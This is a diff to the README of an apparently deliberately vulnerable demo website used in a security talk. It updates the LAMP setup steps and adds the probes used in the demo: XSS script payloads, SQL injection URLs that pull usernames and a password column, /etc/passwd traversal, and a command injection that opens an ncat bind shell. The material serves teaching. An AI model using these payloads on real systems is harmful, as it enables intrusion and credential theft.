@@ -39,47 +39,25 @@ After getting Ubuntu installed, we will want to ensure that it is up-to-date
 ```
 sudo apt-get update
 sudo apt-get upgrade
-sudo apt-get dost-upgrade
+sudo apt-get dist-upgrade
 reboot
 ```
 
 ####Install LAMP stack
 The Linux, Apache, MySQL, PHP (LAMP) stack is a popular open source web platform commonly used to run dynamic web sites and servers.  Since the stack is so popular, we decided to pick on it.
 
-#####Install Apache2
-The A in LAMP
+On Ubuntu the LAMP stack can be installed either separately or with the special package lamp-server
+
 ```
-sudo apt-get install apache2-mpm-prefork apache2-utils libapache2-mod-dnssd -y
-sudo a2enmod rewrite
+sudo apt-get install lamp-server^ -y
 ```
 
-####Install PHP
-The P in LAMP
-```
-sudo apt-get install libapache2-mod-php5 -y
-sudo a2enmod php5
-```
-
-####Install MySQL
-The M in LAMP.  This is also the most complicated install we will be doing.
-```
-sudo apt-get install mysql-server libapache2-mod-auth-mysql php5-mysql -y
-```
+(Mind the caret (^) at the end)
 
 The install process for mysql-server will prompt you to enter a password for the “root” user of the database.  This will be the master administrator password and should be different then the password you use for your user account.  
 
-####Prepare the Database
-The www.angry_monkey.com website has its own unique database inside of MySQL.  We will need to create the database and a user to interact with the database.
-```
-sudo mysql -p
-```
-Enter password from install
-```
-create database web;
-grant select, insert, update, delete, create, drop, index, alter, create temporary tables, lock tables on web.* to 'luser'@'localhost' identified by 's3cr3t1smIsTh3K3y';
-```
-
 ####Setup website
+
 Now comes the fun part.  Installing the www.angry_monkey.com website.  To do this we will clone the git repo and move the files around. 
 
 First we need to make sure that git is installed
@@ -93,20 +71,25 @@ cd ~/Desktop
 git clone https://github.com/chetbishop/Spanking-The-Monkey.git
 ```
 
-Populate the database
+Populate the database, entering the password you setup earlier when prompted.
 ```
 cd Spanking-The-Monkey/WebSite
-gunzip < Database/web.gz | sudo mysql -p web
+mysql -u root -p < Database/schema.sql
 ```
 
 Copy the Apache2 config file
 ```
-sudo cp Apache\ Config/default /etc/apache2/sites-available/000-default.conf
+sudo cp Apache\ Config/default /etc/apache2/sites-enabled/000-default.conf
 ```
 
 Copy the website content
 ```
 sudo cp -r Content/vulnsite/ /var/www/
+```
+
+Enable mod_rewrite in Apache
+```
+sudo a2enmod rewrite
 ```
 
 Restart Apache
@@ -128,11 +111,57 @@ Add the following lines to the bottom of the file
 127.0.0.1 www.angry_monkey.com
 ```
 
+You will also need ncat to exploit the Command Injection vuln. ncat is inside the nmap package in Ubuntu.
+```
+sudo apt-get install nmap
+```
+
 ####Go Have Fun
-You should now be able to open your web browser and go to www.angry_monkey.com
+You should now be able to open your web browser and go to [www.angry_monkey.com](www.angry_monkey.com)
+
+The following probes and commands are used during the demo to test and exploit the different vulnerabilities present on the website.
+
+**Cross-Site Scripting**
+```
+>'>"><owl>
+
+aaa
+1337
+<b>aaa
+<script>alert(1)</script>
+<script>alert(location.host)</script>
+```
+
+**SQL Injection**
+```
+')\
+
+curl www.angry_monkey.com/profiles/42\/antonio
+www.angry_monkey.com/profiles/42\/ OR 1 -- -
+www.angry_monkey.com/profiles/42\/%09OR%091--%09-
+
+www.angry_monkey.com/profiles/42\/%09UNION%09SELECT%091,2,3--%09-
+www.angry_monkey.com/profiles/42\/%09UNION%09SELECT%091,2,3,4--%09-
+
+curl "www.angry_monkey.com/profiles/42\/%09AND%09(SELECT%09*%09FROM%09(SELECT%09*%09FROM%09users%09JOIN%09users%09b%09using%09(id,us3rn4m3))%09a)--%09-"
+curl "www.angry_monkey.com/profiles/42\/%09AND%09(SELECT%09*%09FROM%09(SELECT%09*%09FROM%09users%09JOIN%09users%09b%09using%09(id,us3rn4m3,twitter))%09a)--%09-"
+
+curl "www.angry_monkey.com/profiles/42%5c/OR%09POLYGON((SELECT(1)FROM(SELECT(us3rn4m3),(PassW0rdColuMn)FROM(users)WHERE(id=42))x))--%09-"
+```
+
+**Command Injection**
+```
+/etc/passwd
+../../../../../../../etc/passwd
+;echo 111
+%26%26echo 111
+
+http://www.angry_monkey.com/index.php?doc=us.txt%26%26ncat -c sh -l -p 3333%26
+ncat www.angry_monkey.com 3333
+```
 
 ###Resources
-Our notes for the talk are in the Resources folder.  Below are links for the tools and orginizations we speak about.
+Our notes for the talk are in the Resources folder.  Below are links for the tools and organizations we speak about.
 
 * [OWASP] (https://www.owasp.org)
 * [OWASP Top 10] (https://www.owasp.org/index.php/Top_10_2013)
